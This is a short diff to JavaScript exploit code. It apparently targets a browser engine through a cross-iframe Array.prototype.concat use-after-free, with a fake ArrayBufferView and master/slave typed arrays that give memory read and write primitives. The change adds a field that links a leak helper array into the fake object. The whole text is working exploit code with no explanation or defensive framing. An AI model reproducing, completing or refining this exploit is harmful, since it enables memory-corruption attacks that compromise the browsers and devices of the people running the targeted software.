@@ -296,7 +296,6 @@ var f = document.body.appendChild(document.createElement('iframe'));
 var a = new f.contentWindow.Array(13.37, 13.37);
 var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
 
-
 var master = new Uint32Array(0x1000);
 var slave = new Uint32Array(0x1000);
 var leakval_u32 = new Uint32Array(0x1000);
@@ -304,9 +303,11 @@ var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
 
 // Create fake ArrayBufferView
 tgt.a = u2d(4096, 0x1602300);
-tgt.b = 0;
-tgt.d = 0x1337;
+    tgt.b = 0;
+    tgt.c = leakval_helper;
+    tgt.d = 0x1337;
 
+    
 var c = Array.prototype.concat.call(a, b);
 document.body.removeChild(f);
 var stale = c[0];
